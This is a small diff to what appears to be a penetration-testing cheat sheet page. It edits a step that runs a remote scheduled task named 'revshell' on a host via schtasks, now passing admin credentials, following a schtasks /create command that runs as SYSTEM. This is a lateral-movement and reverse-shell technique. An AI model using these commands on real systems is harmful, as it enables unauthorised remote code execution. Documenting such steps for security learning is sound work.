@@ -202,7 +202,7 @@ C:\Users\user> schtasks /create /s iis.test.com /ru "SYSTEM" /u admin /p pass /t
 
 {% code title="Run the task" overflow="wrap" %}
 ```powershell
-C:\Users\user> schtasks /run /s iis.test.com /tn "revshell"
+C:\Users\user> schtasks /run /s iis.test.com /u admin /p pass /tn "revshell"
 ```
 {% endcode %}
 
